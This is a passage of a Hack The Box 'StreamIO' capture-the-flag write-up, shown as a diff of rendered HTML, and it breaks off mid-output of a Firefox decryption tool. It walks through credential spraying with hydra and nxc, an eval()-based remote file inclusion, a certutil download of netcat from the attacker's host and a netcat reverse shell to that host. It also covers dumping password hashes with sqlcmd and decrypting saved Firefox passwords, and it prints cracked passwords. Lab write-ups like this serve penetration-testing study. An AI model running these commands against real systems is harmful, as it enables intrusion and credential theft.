+</span></span><span class="line"><span class="cl">Sabrina:f87d3c0d6c8fd686aacc6627f1f493a5:!!sabrina$
+</span></span><span class="line"><span class="cl">Thane:3577c47eb1e12c8ba021611e1280753c:highschoolmusical
+</span></span><span class="line"><span class="cl">Victoria:b22abb47a02b52d5dfa27fb0b534f693:!5psycho8!
+</span></span><span class="line"><span class="cl">yoshihide:b779ba15cedfd22a023c4d8bcf5f2332:66boysandgirls..
+</span></span></code></pre></div><p>Barry and yoshihide were the candidates who might have AD accounts. Barry failed both WinRM and SMB:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">…/htb/streamIO ❯ nxc winrm 10.129.11.215 -u barry -p <span class="s1">&#39;$hadoW&#39;</span>
+</span></span><span class="line"><span class="cl">WINRM       10.129.11.215   <span class="m">5985</span>   DC               <span class="o">[</span>*<span class="o">]</span> Windows <span class="m">10</span> / Server <span class="m">2019</span> Build <span class="m">17763</span> <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:streamIO.htb<span class="o">)</span> 
+</span></span><span class="line"><span class="cl">WINRM       10.129.11.215   <span class="m">5985</span>   DC               <span class="o">[</span>-<span class="o">]</span> streamIO.htb<span class="se">\b</span>arry:<span class="nv">$hadoW</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">…/htb/streamIO ✗ nxc smb 10.129.11.215 -u barry -p <span class="s1">&#39;$hadoW&#39;</span>
+</span></span><span class="line"><span class="cl">SMB         10.129.11.215   <span class="m">445</span>    DC               <span class="o">[</span>*<span class="o">]</span> Windows <span class="m">10</span> / Server <span class="m">2019</span> Build <span class="m">17763</span> x64 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:streamIO.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:None<span class="o">)</span>
+</span></span><span class="line"><span class="cl">SMB         10.129.11.215   <span class="m">445</span>    DC               <span class="o">[</span>-<span class="o">]</span> streamIO.htb<span class="se">\b</span>arry:<span class="nv">$hadoW</span> STATUS_LOGON_FAILURE
+</span></span></code></pre></div><p>There was a login page at <code>streamIO.htb/login.php</code>. Neither admin nor barry credentials worked there either. Gobuster on the main domain found an <code>/admin</code> directory with a <code>master.php</code> inside it that returned a bare <code>Only accessible through includes</code> message when accessed directly:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">…/htb/streamIO ❯ gobuster dir -u https://streamIO.htb -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt -k -t <span class="m">50</span> -x php
+</span></span><span class="line"><span class="cl">ADMIN                <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 150<span class="o">]</span> <span class="o">[</span>--&gt; https://streamIO.htb/ADMIN/<span class="o">]</span>
+</span></span><span class="line"><span class="cl">Admin                <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 150<span class="o">]</span> <span class="o">[</span>--&gt; https://streamIO.htb/Admin/<span class="o">]</span>
+</span></span><span class="line"><span class="cl">About.php            <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 7825<span class="o">]</span>
+</span></span><span class="line"><span class="cl">Contact.php          <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 6434<span class="o">]</span>
+</span></span><span class="line"><span class="cl">Login.php            <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 4145<span class="o">]</span>
+</span></span><span class="line"><span class="cl">about.php            <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 7825<span class="o">]</span>
+</span></span><span class="line"><span class="cl">admin                <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 150<span class="o">]</span> <span class="o">[</span>--&gt; https://streamIO.htb/admin/<span class="o">]</span>
+</span></span><span class="line"><span class="cl">contact.php          <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 6434<span class="o">]</span>
+</span></span><span class="line"><span class="cl">index.php            <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 13497<span class="o">]</span>
+</span></span><span class="line"><span class="cl">...
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">…/htb/streamIO ✗ gobuster dir -u https://streamIO.htb/admin -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt -k -t <span class="m">50</span> -x php
+</span></span><span class="line"><span class="cl">Index.php            <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 18<span class="o">]</span>
+</span></span><span class="line"><span class="cl">index.php            <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 18<span class="o">]</span>
+</span></span><span class="line"><span class="cl">master.php           <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 58<span class="o">]</span>
+</span></span></code></pre></div><p>To get into the admin panel I needed valid credentials. Sprayed all cracked credentials against the login page with hydra:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">…/htb/streamIO ❯ hydra -C userpass streamio.htb https-post-form <span class="s2">&#34;/login.php:username=^USER^&amp;password=^PASS^:F=failed&#34;</span>
+</span></span><span class="line"><span class="cl">Hydra v9.7 <span class="o">(</span>c<span class="o">)</span> <span class="m">2023</span> by van Hauser/THC <span class="p">&amp;</span> David Maciejak
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>DATA<span class="o">]</span> max <span class="m">12</span> tasks per <span class="m">1</span> server, overall <span class="m">12</span> tasks, <span class="m">12</span> login tries, ~1 try per task
+</span></span><span class="line"><span class="cl"><span class="o">[</span>DATA<span class="o">]</span> attacking http-post-forms://streamio.htb:443/login.php:username<span class="o">=</span>^USER^<span class="p">&amp;</span><span class="nv">password</span><span class="o">=</span>^PASS^:F<span class="o">=</span>failed
+</span></span><span class="line"><span class="cl"><span class="o">[</span>443<span class="o">][</span>http-post-form<span class="o">]</span> host: streamio.htb   login: yoshihide   password: 66boysandgirls..
+</span></span><span class="line"><span class="cl"><span class="m">1</span> of <span class="m">1</span> target successfully completed, <span class="m">1</span> valid password found
+</span></span><span class="line"><span class="cl">Hydra <span class="o">(</span>https://github.com/vanhauser-thc/thc-hydra<span class="o">)</span> finished at 2026-06-03 05:14:06
+</span></span></code></pre></div><p><code>yoshihide:66boysandgirls..</code> logged in.</p>
+<h2 id="admin-panel-rfi-and-eval-rce">Admin Panel: RFI and eval() RCE</h2>
+<p><img src="/images/writeups/htb-streamio/web-admin-panel-logged-in.png" alt="streamio.htb admin panel showing User management, Staff management, Movie management, and Leave a message for admin options"></p>
+<p>Each button in the admin panel appended a query parameter: <code>?user=</code>, <code>?staff=</code>, <code>?movie=</code>. Fuzzing for additional parameters with a valid session cookie found a <code>debug</code> parameter. Testing <code>?debug=master.php</code> loaded the Movie management page, so <code>debug</code> was feeding a filename into <code>include()</code> server-side.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">…/htb/streamIO ❯ ffuf -u <span class="s2">&#34;https://streamio.htb/admin/index.php?FUZZ=master.php&#34;</span> -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt -H <span class="s2">&#34;Cookie: PHPSESSID=fflo9cp8c2nkda0rq73klq9cfs&#34;</span> -fw <span class="m">85</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">debug                   <span class="o">[</span>Status: 200, Size: 343060, Words: 17814, Lines: 11171, Duration: 94ms<span class="o">]</span>
+</span></span><span class="line"><span class="cl">movie                   <span class="o">[</span>Status: 200, Size: 320235, Words: 15986, Lines: 10791, Duration: 115ms<span class="o">]</span>
+</span></span><span class="line"><span class="cl">staff                   <span class="o">[</span>Status: 200, Size: 12484, Words: 1784, Lines: 399, Duration: 93ms<span class="o">]</span>
+</span></span><span class="line"><span class="cl">user                    <span class="o">[</span>Status: 200, Size: 2444, Words: 206, Lines: 75, Duration: 69ms<span class="o">]</span>
+</span></span><span class="line"><span class="cl">:: Progress: <span class="o">[</span>6453/6453<span class="o">]</span> :: Job <span class="o">[</span>1/1<span class="o">]</span> :: <span class="m">457</span> req/sec :: Duration: <span class="o">[</span>0:00:14<span class="o">]</span> :: Errors: <span class="m">0</span> ::
+</span></span></code></pre></div><p>The next question was whether it could load a remote URL instead of a local path. Remote File Inclusion works when PHP&rsquo;s <code>allow_url_include</code> is enabled. If <code>include()</code> accepts URLs, pointing it at a file on my machine would make the PHP server fetch my file and execute it.</p>
+<p>Before testing blind, I used it to read the server&rsquo;s own source code first, pointing <code>include</code> at the local <code>master.php</code> path to leak it:</p>
+<p><img src="/images/writeups/htb-streamio/web-rfi-master-php-source-code.png" alt="Burp Suite POST request with include parameter pointing to master.php, response showing PHP source code with eval(file_get_contents($_POST[‘include’])) highlighted"></p>
+<p>The relevant section at the bottom of master.php:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;include&#39;</span><span class="p">]))</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;include&#39;</span><span class="p">]</span> <span class="o">!==</span> <span class="s2">&#34;index.php&#34;</span> <span class="p">)</span> 
+</span></span><span class="line"><span class="cl"><span class="k">eval</span><span class="p">(</span><span class="nx">file_get_contents</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;include&#39;</span><span class="p">]));</span>
+</span></span><span class="line"><span class="cl"><span class="k">else</span>
+</span></span><span class="line"><span class="cl"><span class="k">echo</span><span class="p">(</span><span class="s2">&#34; ---- ERROR ---- &#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p><code>eval(file_get_contents($_POST['include']))</code>. It fetches whatever URL or path you pass in the <code>include</code> POST parameter and evaluates it as PHP. This is full RCE: serve a PHP file with <code>system()</code> calls from a local HTTP server, and the box will fetch and execute it. The only restriction is that <code>index.php</code> is blocked by name check.</p>
+<p>Source code also leaked the database credentials: <code>db_admin:B1@hx31234567890</code>.</p>
+<p>The execution chain: POST to <code>/admin/?debug=master.php</code> with <code>include=http://10.10.16.129:9000/shell.php</code>. Tested with a directory listing first:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">…/htb/streamIO ✗ cat &gt; shell.php
+</span></span><span class="line"><span class="cl">system<span class="o">(</span><span class="s2">&#34;dir C:\Users\&#34;);
+</span></span></span></code></pre></div><pre tabindex="0"><code>POST /admin/?debug=master.php HTTP/2
 Host: streamio.htb
 Cookie: PHPSESSID=670s23j1d7v5u7pve1avvgpfpa
 Content-Type: application/x-www-form-urlencoded
 
 include=http://10.10.16.129:9000/shell.php
-</code></pre><p>Directory listing came back at the bottom of the response. Uploaded nc64.exe via certutil:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>…/htb/streamIO ✗ cat &gt; shell.php
-</span></span><span class=line><span class=cl>system<span class=o>(</span><span class=s2>&#34;certutil -urlcache -f http://10.10.16.129:9000/nc64.exe nc.exe&#34;</span><span class=o>)</span><span class=p>;</span>
-</span></span></code></pre></div><p>Then triggered a reverse shell:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>…/htb/streamIO ✗ cat &gt; shell.php
-</span></span><span class=line><span class=cl>system<span class=o>(</span><span class=s2>&#34;nc.exe 10.10.16.129 9999 -e cmd.exe&#34;</span><span class=o>)</span><span class=p>;</span>
-</span></span></code></pre></div><pre tabindex=0><code> Directory of C:\Users
+</code></pre><p>Directory listing came back at the bottom of the response. Uploaded nc64.exe via certutil:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">…/htb/streamIO ✗ cat &gt; shell.php
+</span></span><span class="line"><span class="cl">system<span class="o">(</span><span class="s2">&#34;certutil -urlcache -f http://10.10.16.129:9000/nc64.exe nc.exe&#34;</span><span class="o">)</span><span class="p">;</span>
+</span></span></code></pre></div><p>Then triggered a reverse shell:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">…/htb/streamIO ✗ cat &gt; shell.php
+</span></span><span class="line"><span class="cl">system<span class="o">(</span><span class="s2">&#34;nc.exe 10.10.16.129 9999 -e cmd.exe&#34;</span><span class="o">)</span><span class="p">;</span>
+</span></span></code></pre></div><pre tabindex="0"><code> Directory of C:\Users
 
 02/22/2022  03:48 AM    &lt;DIR&gt;          .
 02/22/2022  03:48 AM    &lt;DIR&gt;          ..
@@ -162,65 +391,76 @@ include=http://10.10.16.129:9000/shell.php
 02/22/2022  02:33 AM    &lt;DIR&gt;          Public
                0 File(s)              0 bytes
                8 Dir(s)   7,176,941,568 bytes free
-</code></pre><p>Shell as <code>yoshihide</code>. <code>whoami /all</code> confirmed this is the IIS application pool account, equivalent to <code>www-data</code> on Linux:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>whoami /all
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl>USER INFORMATION
-</span></span><span class=line><span class=cl>----------------
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl>User Name          <span class=nv>SID</span>                                           
-</span></span><span class=line><span class=cl><span class=o>==================</span> <span class=o>==============================================</span>
-</span></span><span class=line><span class=cl>streamio<span class=se>\y</span>oshihide S-1-5-21-1470860369-1569627196-4264678630-1107
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl>GROUP INFORMATION
-</span></span><span class=line><span class=cl>-----------------
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl>Group Name                                  Type             SID          <span class=nv>Attributes</span>                                        
-</span></span><span class=line><span class=cl><span class=o>===========================================</span> <span class=o>================</span> <span class=o>============</span> <span class=o>==================================================</span>
-</span></span><span class=line><span class=cl>Everyone                                    Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
-</span></span><span class=line><span class=cl>BUILTIN<span class=se>\U</span>sers                               Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
-</span></span><span class=line><span class=cl>BUILTIN<span class=se>\P</span>re-Windows <span class=m>2000</span> Compatible Access  Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
-</span></span><span class=line><span class=cl>NT AUTHORITY<span class=se>\N</span>ETWORK                        Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
-</span></span><span class=line><span class=cl>NT AUTHORITY<span class=se>\A</span>uthenticated Users            Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
-</span></span><span class=line><span class=cl>NT AUTHORITY<span class=se>\T</span>his Organization              Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
-</span></span><span class=line><span class=cl>Authentication authority asserted identity  Well-known group S-1-18-1     Mandatory group, Enabled by default, Enabled group
-</span></span><span class=line><span class=cl>Mandatory Label<span class=se>\M</span>edium Plus Mandatory Level Label            S-1-16-8448                                                    
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl>PRIVILEGES INFORMATION
-</span></span><span class=line><span class=cl>----------------------
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl>Privilege Name                Description                    <span class=nv>State</span>  
-</span></span><span class=line><span class=cl><span class=o>=============================</span> <span class=o>==============================</span> <span class=o>=======</span>
-</span></span><span class=line><span class=cl>SeMachineAccountPrivilege     Add workstations to domain     Enabled
-</span></span><span class=line><span class=cl>SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
-</span></span><span class=line><span class=cl>SeIncreaseWorkingSetPrivilege Increase a process working <span class=nb>set</span> Enabled
-</span></span></code></pre></div><p>No interesting privileges, no access to other users&rsquo; directories.</p><h2 id=lateral-movement-to-nikk37>Lateral Movement to nikk37</h2><p><code>C:\Users\</code> showed Administrator, Martin, nikk37, and Public. <code>yoshihide</code> wasn&rsquo;t there. The web account doesn&rsquo;t have a home directory.</p><p>The database credentials from the source code were usable. <code>sqlcmd</code> from the shell:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>C:<span class=se>\i</span>netpub<span class=se>\s</span>treamio.htb&gt;sqlcmd -S localhost -U db_admin -P <span class=s2>&#34;B1@hx31234567890&#34;</span> -Q <span class=s2>&#34;SELECT name FROM sys.databases&#34;</span>
-</span></span><span class=line><span class=cl>name                                                                                                                            
-</span></span><span class=line><span class=cl>--------------------------------------------------------------------------------------------------------------------------------
-</span></span><span class=line><span class=cl>master                                                                                                                          
-</span></span><span class=line><span class=cl>tempdb                                                                                                                          
-</span></span><span class=line><span class=cl>model                                                                                                                           
-</span></span><span class=line><span class=cl>msdb                                                                                                                            
-</span></span><span class=line><span class=cl>STREAMIO                                                                                                                        
-</span></span><span class=line><span class=cl>streamio_backup                                                                                                                 
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl><span class=o>(</span><span class=m>6</span> rows affected<span class=o>)</span>
-</span></span></code></pre></div><p>Six databases, including one that wasn&rsquo;t in the original enumeration: <code>streamio_backup</code>. Same schema as the main database, movies and users tables:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>C:<span class=se>\i</span>netpub<span class=se>\s</span>treamio.htb&gt;sqlcmd -S localhost -U db_admin -P <span class=s2>&#34;B1@hx31234567890&#34;</span> -d streamio_backup -Q <span class=s2>&#34;SELECT table_name FROM information_schema.tables&#34;</span>
-</span></span><span class=line><span class=cl>table_name                                                                                                                      
-</span></span><span class=line><span class=cl>--------------------------------------------------------------------------------------------------------------------------------
-</span></span><span class=line><span class=cl>movies                                                                                                                          
-</span></span><span class=line><span class=cl>users                                                                                                                           
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl><span class=o>(</span><span class=m>2</span> rows affected<span class=o>)</span>
-</span></span></code></pre></div><p>nikk37 was in the backup users table:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>C:<span class=se>\i</span>netpub<span class=se>\s</span>treamio.htb&gt;sqlcmd -S localhost -U db_admin -P <span class=s2>&#34;B1@hx31234567890&#34;</span> -d streamio_backup -Q <span class=s2>&#34;SELECT * FROM users WHERE username = &#39;nikk37&#39;&#34;</span>
-</span></span><span class=line><span class=cl>id          username                                           password                                          
-</span></span><span class=line><span class=cl>----------- -------------------------------------------------- --------------------------------------------------
-</span></span><span class=line><span class=cl>          <span class=m>1</span> nikk37                                             389d14cb8e4e9b94b137deb1caf0612a
-</span></span></code></pre></div><p>Cracked: <code>nikk37:get_dem_girls2@yahoo.com</code>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>…/htb/streamIO ❯ nxc winrm <span class=nv>$DC_IP</span> -u nikk37 -p <span class=s1>&#39;get_dem_girls2@yahoo.com&#39;</span>
-</span></span><span class=line><span class=cl>WINRM       10.129.11.215   <span class=m>5985</span>   DC               <span class=o>[</span>*<span class=o>]</span> Windows <span class=m>10</span> / Server <span class=m>2019</span> Build <span class=m>17763</span> <span class=o>(</span>name:DC<span class=o>)</span> <span class=o>(</span>domain:streamIO.htb<span class=o>)</span> 
-</span></span><span class=line><span class=cl>WINRM       10.129.11.215   <span class=m>5985</span>   DC               <span class=o>[</span>+<span class=o>]</span> streamIO.htb<span class=se>\n</span>ikk37:get_dem_girls2@yahoo.com <span class=o>(</span>Pwn3d!<span class=o>)</span>
-</span></span></code></pre></div><p>User flag on his desktop.</p><h2 id=firefox-credentials-and-the-laps-chain>Firefox Credentials and the LAPS Chain</h2><p>nikk37&rsquo;s <code>whoami /all</code> showed nothing interesting privilege-wise. Uploaded SharpHound and WinPEAS. WinPEAS found something in its browser credential section:</p><pre tabindex=0><code>╔══════════╗ Showing saved credentials for Firefox
+</code></pre><p>Shell as <code>yoshihide</code>. <code>whoami /all</code> confirmed this is the IIS application pool account, equivalent to <code>www-data</code> on Linux:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">whoami /all
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">USER INFORMATION
+</span></span><span class="line"><span class="cl">----------------
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">User Name          <span class="nv">SID</span>                                           
+</span></span><span class="line"><span class="cl"><span class="o">==================</span> <span class="o">==============================================</span>
+</span></span><span class="line"><span class="cl">streamio<span class="se">\y</span>oshihide S-1-5-21-1470860369-1569627196-4264678630-1107
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">GROUP INFORMATION
+</span></span><span class="line"><span class="cl">-----------------
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Group Name                                  Type             SID          <span class="nv">Attributes</span>                                        
+</span></span><span class="line"><span class="cl"><span class="o">===========================================</span> <span class="o">================</span> <span class="o">============</span> <span class="o">==================================================</span>
+</span></span><span class="line"><span class="cl">Everyone                                    Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
+</span></span><span class="line"><span class="cl">BUILTIN<span class="se">\U</span>sers                               Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
+</span></span><span class="line"><span class="cl">BUILTIN<span class="se">\P</span>re-Windows <span class="m">2000</span> Compatible Access  Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
+</span></span><span class="line"><span class="cl">NT AUTHORITY<span class="se">\N</span>ETWORK                        Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
+</span></span><span class="line"><span class="cl">NT AUTHORITY<span class="se">\A</span>uthenticated Users            Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
+</span></span><span class="line"><span class="cl">NT AUTHORITY<span class="se">\T</span>his Organization              Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
+</span></span><span class="line"><span class="cl">Authentication authority asserted identity  Well-known group S-1-18-1     Mandatory group, Enabled by default, Enabled group
+</span></span><span class="line"><span class="cl">Mandatory Label<span class="se">\M</span>edium Plus Mandatory Level Label            S-1-16-8448                                                    
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">PRIVILEGES INFORMATION
+</span></span><span class="line"><span class="cl">----------------------
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Privilege Name                Description                    <span class="nv">State</span>  
+</span></span><span class="line"><span class="cl"><span class="o">=============================</span> <span class="o">==============================</span> <span class="o">=======</span>
+</span></span><span class="line"><span class="cl">SeMachineAccountPrivilege     Add workstations to domain     Enabled
+</span></span><span class="line"><span class="cl">SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+</span></span><span class="line"><span class="cl">SeIncreaseWorkingSetPrivilege Increase a process working <span class="nb">set</span> Enabled
+</span></span></code></pre></div><p>No interesting privileges, no access to other users&rsquo; directories.</p>
+<h2 id="lateral-movement-to-nikk37">Lateral Movement to nikk37</h2>
+<p><code>C:\Users\</code> showed Administrator, Martin, nikk37, and Public. <code>yoshihide</code> wasn&rsquo;t there. The web account doesn&rsquo;t have a home directory.</p>
+<p>The database credentials from the source code were usable. <code>sqlcmd</code> from the shell:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">C:<span class="se">\i</span>netpub<span class="se">\s</span>treamio.htb&gt;sqlcmd -S localhost -U db_admin -P <span class="s2">&#34;B1@hx31234567890&#34;</span> -Q <span class="s2">&#34;SELECT name FROM sys.databases&#34;</span>
+</span></span><span class="line"><span class="cl">name                                                                                                                            
+</span></span><span class="line"><span class="cl">--------------------------------------------------------------------------------------------------------------------------------
+</span></span><span class="line"><span class="cl">master                                                                                                                          
+</span></span><span class="line"><span class="cl">tempdb                                                                                                                          
+</span></span><span class="line"><span class="cl">model                                                                                                                           
+</span></span><span class="line"><span class="cl">msdb                                                                                                                            
+</span></span><span class="line"><span class="cl">STREAMIO                                                                                                                        
+</span></span><span class="line"><span class="cl">streamio_backup                                                                                                                 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">(</span><span class="m">6</span> rows affected<span class="o">)</span>
+</span></span></code></pre></div><p>Six databases, including one that wasn&rsquo;t in the original enumeration: <code>streamio_backup</code>. Same schema as the main database, movies and users tables:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">C:<span class="se">\i</span>netpub<span class="se">\s</span>treamio.htb&gt;sqlcmd -S localhost -U db_admin -P <span class="s2">&#34;B1@hx31234567890&#34;</span> -d streamio_backup -Q <span class="s2">&#34;SELECT table_name FROM information_schema.tables&#34;</span>
+</span></span><span class="line"><span class="cl">table_name                                                                                                                      
+</span></span><span class="line"><span class="cl">--------------------------------------------------------------------------------------------------------------------------------
+</span></span><span class="line"><span class="cl">movies                                                                                                                          
+</span></span><span class="line"><span class="cl">users                                                                                                                           
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">(</span><span class="m">2</span> rows affected<span class="o">)</span>
+</span></span></code></pre></div><p>nikk37 was in the backup users table:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">C:<span class="se">\i</span>netpub<span class="se">\s</span>treamio.htb&gt;sqlcmd -S localhost -U db_admin -P <span class="s2">&#34;B1@hx31234567890&#34;</span> -d streamio_backup -Q <span class="s2">&#34;SELECT * FROM users WHERE username = &#39;nikk37&#39;&#34;</span>
+</span></span><span class="line"><span class="cl">id          username                                           password                                          
+</span></span><span class="line"><span class="cl">----------- -------------------------------------------------- --------------------------------------------------
+</span></span><span class="line"><span class="cl">          <span class="m">1</span> nikk37                                             389d14cb8e4e9b94b137deb1caf0612a
+</span></span></code></pre></div><p>Cracked: <code>nikk37:get_dem_girls2@yahoo.com</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">…/htb/streamIO ❯ nxc winrm <span class="nv">$DC_IP</span> -u nikk37 -p <span class="s1">&#39;get_dem_girls2@yahoo.com&#39;</span>
+</span></span><span class="line"><span class="cl">WINRM       10.129.11.215   <span class="m">5985</span>   DC               <span class="o">[</span>*<span class="o">]</span> Windows <span class="m">10</span> / Server <span class="m">2019</span> Build <span class="m">17763</span> <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:streamIO.htb<span class="o">)</span> 
+</span></span><span class="line"><span class="cl">WINRM       10.129.11.215   <span class="m">5985</span>   DC               <span class="o">[</span>+<span class="o">]</span> streamIO.htb<span class="se">\n</span>ikk37:get_dem_girls2@yahoo.com <span class="o">(</span>Pwn3d!<span class="o">)</span>
+</span></span></code></pre></div><p>User flag on his desktop.</p>
+<h2 id="firefox-credentials-and-the-laps-chain">Firefox Credentials and the LAPS Chain</h2>
+<p>nikk37&rsquo;s <code>whoami /all</code> showed nothing interesting privilege-wise. Uploaded SharpHound and WinPEAS. WinPEAS found something in its browser credential section:</p>
+<pre tabindex="0"><code>╔══════════╗ Showing saved credentials for Firefox
     Info: if no credentials were listed, you might need to close the browser and try again.
 
 ╔══════════╗ Looking for Firefox DBs
@@ -232,106 +472,263 @@ include=http://10.10.16.129:9000/shell.php
 ╚     https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#browsers-history
 
     [x] IO exception, places.sqlite file likely in use (i.e. Firefox is likely running).
-</code></pre><p>Firefox stores saved passwords using symmetric encryption. The encryption key is derived from the master password. If no master password is set, the key derivation uses a blank string, which means any tool with the right logic can decrypt the credentials without cracking anything. The credentials themselves are in <code>logins.json</code>, the key material in <code>key4.db</code>, and the certificate database in <code>cert9.db</code>. Downloaded all three, then ran them through firepwd:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>…/streamIO/firefox ❯ python3 firepwd/firepwd.py -d .
-</span></span><span class=line><span class=cl>globalSalt: b<span class=s1>&#39;d215c391179edb56af928a06c627906bcbd4bd47&#39;</span>
-</span></span><span class=line><span class=cl> SEQUENCE <span class=o>{</span>
-</span></span><span class=line><span class=cl>   SEQUENCE <span class=o>{</span>
-</span></span><span class=line><span class=cl>     OBJECTIDENTIFIER 1.2.840.113549.1.5.13 pkcs5 pbes2
-</span></span><span class=line><span class=cl>     SEQUENCE <span class=o>{</span>
-</span></span><span class=line><span class=cl>       SEQUENCE <span class=o>{</span>
-</span></span><span class=line><span class=cl>         OBJECTIDENTIFIER 1.2.840.113549.1.5.12 pkcs5 PBKDF2
-</span></span><span class=line><span class=cl>         SEQUENCE <span class=o>{</span>
-</span></span><span class=line><span class=cl>           OCTETSTRING b<span class=s1>&#39;5d573772912b3c198b1e3ee43ccb0f03b0b23e46d51c34a2a055e00ebcd240f5&#39;</span>
-</span></span><span class=line><span class=cl>           INTEGER b<span class=s1>&#39;01&#39;</span>
-</span></span><span class=line><span class=cl>           INTEGER b<span class=s1>&#39;20&#39;</span>
